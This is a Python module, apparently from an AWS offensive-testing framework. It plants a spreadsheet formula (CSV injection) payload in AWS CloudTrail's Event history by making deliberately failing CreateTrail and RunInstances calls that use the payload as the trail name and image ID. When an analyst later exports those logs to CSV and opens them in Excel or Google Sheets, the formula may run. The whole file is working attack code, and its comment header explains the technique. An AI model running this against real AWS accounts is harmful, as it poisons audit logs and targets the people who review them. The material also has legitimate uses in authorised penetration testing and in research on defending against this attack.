#!/usr/bin/env python3

#'description': ''This module will attempt to create a CloudTrail trail with a malicious Microsoft Excel and/or Google Sheets formula as the name as well as try to create an EC2 instance with the formula as the image ID. This is because a failed call won\'t work correctly. The failed events will be logged to CloudTrail\'s "Event history" page, where the past 90 days of API calls are listed. The logs can be exported to a .csv file, which due to the way that CloudTrail displays/exports the "Affected Resources" column, the formula we supply as a payload will attempt to execute. Payloads exist for both Microsoft Excel and Google Sheets. My blog post for this specific module is here: https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/. Further reading can be found here: https://www.we45.com/2017/02/14/csv-injection-theres-devil-in-the-detail/ and here: http://georgemauer.net/2017/10/07/csv-injection.html',


import datetime
import argparse
from botocore.exceptions import ClientError


def main(args, awsattack_main):
    print = awsattack_main.print
    get_regions = awsattack_main.get_regions

    summary_data = {'success': 0, 'fails': 0}
    if args.regions:
        regions = args.regions.split(',')
    else:
        regions = get_regions('cloudtrail')

    for region in regions:
        print('Starting region {}...'.format(region))
        print('  Starting CreateTrail attack...')
        client = awsattack_main.get_boto3_client('cloudtrail', region)
        try:
            client.create_trail(
                Name=args.payload,
                S3BucketName=args.payload
            )
            print('    FAILURE:')
            print('      Trail created. Payload fit the parameters for a valid trail name')
            print('      Exiting...')
            summary_data['fails'] += 1
            return summary_data
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'InvalidTrailNameException':
                print('    Attack succeeded')
                summary_data['success'] += 1
                continue
            else:
                print('  FAILURE:')
                if code == 'AccessDeniedException':
                    print('    MISSING NEEDED PERMISSIONS')
                else:
                    print('    ' + str(code))

        print('  Starting RunInstances attack...')
        client = awsattack_main.get_boto3_client('ec2', region)
        try:
            client.run_instances(
                ImageId=args.payload,
                MaxCount=1,
                MinCount=1
            )
            print('    FAILURE:')
            print('      Instance Launched. Payload fit the parameters for a valid ImageId')
            print('      Exiting...')
            summary_data['fails'] += 1
            return summary_data
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'InvalidAMIID.Malformed':
                print('    Attack succeeded')
                summary_data['success'] += 1
                continue
            else:
                print('  FAILURE:')
                if code == 'AccessDeniedException':
                    print('    MISSING NEEDED PERMISSIONS')
                else:
                    print('    ' + str(code))
        summary_data['fails'] += 1
    
    return summary_data
